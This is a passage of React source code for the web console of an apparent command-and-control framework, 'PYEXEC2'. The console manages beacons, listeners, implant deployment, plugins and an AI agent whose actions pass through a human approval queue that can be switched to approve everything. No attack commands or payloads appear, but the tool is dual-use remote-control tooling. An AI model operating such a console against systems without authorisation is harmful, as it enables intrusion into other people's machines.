      if (result?.status === 'approval_required') setMsg(`模式切换已进入审批：${result.approval?.id || ''}`)
      else setMsg(`审批模式：${mode}`)
      await refresh()
    } catch (err) { setMsg(err.message) } finally { setBusy(false) }
  }
  return <div className="page"><header className="page-head"><div><div className="eyebrow">APPROVAL QUEUE</div><h1>审批</h1><p>人工与 AI 使用同一套审批 API：查看、放行、拒绝、批量放行和批量拒绝。</p></div><button className="ghost" onClick={refresh}>刷新审批</button></header>
    {msg && <Banner text={msg} />}
    <Panel title="审批策略" eyebrow="POLICY">
      <div className="quick-buttons"><button className={status?.approval_mode === 'all_allow' ? 'primary' : 'ghost'} onClick={() => setMode('all_allow')} disabled={busy}>全部放行</button><button className={status?.approval_mode === 'per_action' ? 'primary' : 'ghost'} onClick={() => setMode('per_action')} disabled={busy}>逐条审批</button><span className="micro">当前：{status?.approval_mode === 'per_action' ? '逐条审批' : '全部放行'}</span></div>
    </Panel>
    <Panel title="审批列表" eyebrow="QUEUE" right={<div className="quick-buttons"><button className={filter === 'pending' ? 'primary' : 'ghost'} onClick={() => setFilter('pending')}>待审批</button><button className={filter === 'all' ? 'primary' : 'ghost'} onClick={() => setFilter('all')}>全部</button><button className="ghost" onClick={() => resolveAll('approve')} disabled={busy}>全部放行</button><button className="ghost danger" onClick={() => resolveAll('reject')} disabled={busy}>全部拒绝</button></div>}>
      <div className="table"><div className="tr th"><span>动作</span><span>参数</span><span>状态</span><span>时间</span><span>操作</span></div>{list.map(a => <div className="tr approval-row" key={a.id} role="button" tabIndex={0} title="点击查看完整命令与参数" onClick={() => openDetail(a)} onKeyDown={e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openDetail(a) } }}><span className="approval-action-cell"><strong>{a.action}</strong><small className="mono approval-meta"><span className="approval-actor">{a.actor || 'ai'}</span><span className="approval-id">{a.id}</span></small></span><span className="mono">{JSON.stringify(a.args || {}).slice(0, 90)}</span><span><Status status={a.status === 'pending' ? 'waiting' : a.status === 'approved' ? 'succeeded' : 'failed'} /></span><span>{a.created_at?.slice(11, 19)}</span><span className="quick-buttons" onClick={e => e.stopPropagation()}>{a.status === 'pending' && <><button className="ghost" onClick={() => resolve(a.id, 'approve')} disabled={busy}>放行</button><button className="ghost danger" onClick={() => resolve(a.id, 'reject')} disabled={busy}>拒绝</button></>}</span></div>)}{!list.length && <div className="empty">暂无审批记录</div>}</div>
    </Panel>
    {detailRecord && <div className="modal-back" onClick={() => setDetail(null)}><div className="modal approval-detail-modal" onClick={e => e.stopPropagation()}><div className="modal-head"><div><div className="eyebrow">APPROVAL DETAIL</div><h2>{detailRecord.action}</h2><p className="micro">{detailRecord.id}</p></div><button className="ghost" onClick={() => setDetail(null)}>关闭</button></div><div className="approval-detail-body"><div className="approval-detail-meta"><div><span>发起者</span><strong>{detailRecord.actor || 'ai'}</strong></div><div><span>状态</span><strong>{detailRecord.status}</strong></div><div><span>创建时间</span><strong>{detailRecord.created_at || '-'}</strong></div></div><div className="approval-detail-section"><div className="eyebrow">COMMAND / ARGS</div><pre>{approvalCommandText(detailRecord)}</pre></div><div className="approval-detail-section"><div className="eyebrow">RAW JSON</div><pre>{JSON.stringify(detailRecord.args || {}, null, 2)}</pre></div>{detailRecord.status === 'pending' && <div className="approval-detail-advice"><label>拒绝建议（可选，会作为工具输出返回给 AI）</label><textarea value={rejectAdvice} onChange={e => setRejectAdvice(e.target.value)} placeholder="例如：不要执行这个命令，先只读查看目标目录；或先说明为什么要执行这个动作。" /></div>}{detailRecord.status === 'rejected' && detailRecord.suggestion && <div className="approval-detail-section rejected"><div className="eyebrow">REJECTION SUGGESTION</div><pre>{detailRecord.suggestion}</pre></div>}</div><div className="modal-actions"><button className="ghost" onClick={() => setDetail(null)}>关闭</button>{detailRecord.status === 'pending' && <><button className="ghost danger" onClick={() => resolve(detailRecord.id, 'reject', rejectAdvice)} disabled={busy}>拒绝并返回建议</button><button className="primary" onClick={() => resolve(detailRecord.id, 'approve')} disabled={busy}>放行</button></>}</div></div></div>}
  </div>
}

function AppInner() {
  const [page, setPage] = useState('overview')
  const [status, setStatus] = useState(null)
  const [beacons, setBeacons] = useState([])
  const [listeners, setListeners] = useState([])
  const [protocols, setProtocols] = useState([])
  const [tasks, setTasks] = useState([])
  const [approvals, setApprovals] = useState([])
  const [groups, setGroups] = useState([])
  const [globalAuto, setGlobalAuto] = useState({ tasks: [] })
  const [plugins, setPlugins] = useState([])
  const [selectedBeacon, setSelectedBeacon] = useState('')
  const [error, setError] = useState('')
  const [session, setSession] = useState(null)
  const [clock, setClock] = useState('')
  const pendingApprovalCount = approvals.filter(a => a.status === 'pending').length

  const refresh = useCallback(async () => {
    try {
      const [s, b, l, t, pl, ap, gr, ga] = await Promise.all([
        action('server.status'), action('beacon.list'), action('listener.list'),
        action('task.list'), action('plugin.list'), action('approval.list'), action('group.list'), action('auto.global.get'),
      ])
      setStatus(s); setBeacons(b); setListeners(l); setTasks(t); setPlugins(pl); setApprovals(ap); setGroups(gr); setGlobalAuto(ga); setProtocols(s.protocols || []); setError('')
    } catch (err) { setError(err.message) }
  }, [])
  useEffect(() => { refresh(); const id = setInterval(refresh, 4000); return () => clearInterval(id) }, [refresh])
  useEffect(() => { fetch('/api/session', { headers: { 'X-PyExec-Auth': sessionStorage.getItem('pyexec_token') || '' } }).then(r => r.json()).then(setSession).catch(() => {}) }, [])
  useEffect(() => {
    const tick = () => setClock(new Date().toLocaleTimeString('en-GB', { hour12: false }))
    tick()
    const id = setInterval(tick, 1000)
    return () => clearInterval(id)
  }, [])
  const openBeacon = (id) => { setSelectedBeacon(id); setPage('beacon') }
  const beacon = beacons.find(b => b.id === selectedBeacon)
  let content
  if (page === 'beacon') content = beacon ? <BeaconConsole beacon={beacon} plugins={plugins} listeners={listeners} onBack={() => setPage('overview')} /> : <div className="page"><Banner text="Beacon 已离线或不存在" tone="error" /></div>
  else if (page === 'deploy') content = <Deployment protocols={protocols} listeners={listeners} refresh={refresh} />
  else if (page === 'plugins') content = <Plugins plugins={plugins} refresh={refresh} />
  else if (page === 'approvals') content = <Approvals approvals={approvals} status={status} refresh={refresh} />
  else if (page === 'ai-guide') content = <AIGuide />
  else if (page === 'ai-agent') content = null
  else if (page === 'notebooks') content = <Notebooks />
  else content = <Overview status={status} beacons={beacons} groups={groups} globalAuto={globalAuto} tasks={tasks} listeners={listeners} approvals={approvals} openBeacon={openBeacon} refresh={refresh} />
  const pageLabel = page === 'beacon' ? 'BEACON NODE' : page === 'deploy' ? 'DEPLOYMENT BAY' : page === 'plugins' ? 'PLUGIN FORGE' : page === 'approvals' ? 'APPROVAL GATE' : page === 'ai-guide' ? 'AI INTEGRATION MANUAL' : page === 'ai-agent' ? 'BUILT-IN AI AGENT' : page === 'notebooks' ? 'LOCAL NOTEBOOK' : 'BEACON OVERVIEW'
  return <div className="app"><div className="ambient-grid" aria-hidden="true" /><div className="ambient-scan" aria-hidden="true" /><aside className="sidebar"><div className="brand"><div className="brand-mark"><span>P</span><i /></div><div className="brand-copy"><strong>PYEXEC2</strong><small>COMMAND MATRIX</small></div></div><div className="nav-label">OPERATIONS</div><nav>{NAV.map(([id, label, icon]) => <button key={id} className={page === id || (id === 'overview' && page === 'beacon') ? 'active' : ''} onClick={() => setPage(id)}><span>{icon}</span><em>{label}</em>{id === 'approvals' && pendingApprovalCount > 0 ? <b className="nav-badge" aria-label={`${pendingApprovalCount} 条待审批`}>{pendingApprovalCount > 99 ? '99+' : pendingApprovalCount}</b> : <i className="nav-pip" />}</button>)}</nav><div className="side-signal"><span /><span /><span /><span /><span /></div><div className="side-bottom"><div className="token-state"><span className="dot online" /> ENCRYPTED LINK</div><div className="side-role"><span>ROLE</span><strong>{session?.role || 'human'}</strong></div><div className="micro">server: {status?.workdir || '—'}</div><div className="micro">approval: {status?.approval_mode || '—'}</div></div></aside><main className="main"><header className="topbar"><div className="topbar-left"><span className="hex-dot" /><div><span className="eyebrow">SECURE CONTROL PLANE</span><strong>{pageLabel}</strong></div></div><div className="top-meta"><span className="meta-chip">{beacons.filter(b => b.status === 'online').length}/{beacons.length} <small>BEACONS</small></span><span className="meta-chip">{tasks.length} <small>TASKS</small></span><span className="meta-chip">{plugins.length} <small>PLUGINS</small></span><span className="clock">{clock}</span></div></header>{error && <Banner text={error} tone="error" />}<div className="content-shell"><div className={`persistent-page ${page === 'ai-agent' ? 'active' : ''}`}><AIAgent onOpenApprovals={() => setPage('approvals')} /></div>{page !== 'ai-agent' && content}</div><footer className="annunciator"><span className="ann-lamp" /><span>SYS // NOMINAL</span><span>UPLINK {beacons.filter(b => b.status === 'online').length}/{beacons.length}</span><span>ROLE {session?.role || 'human'}</span><span>MODE {status?.approval_mode === 'per_action' ? 'PER ACTION' : 'ALL ALLOW'}</span><span className="ann-right">PYEXEC2 // COMMAND MATRIX</span></footer></main></div>
}

export default function App() {
  return <ConfigGate><AppInner /></ConfigGate>
}
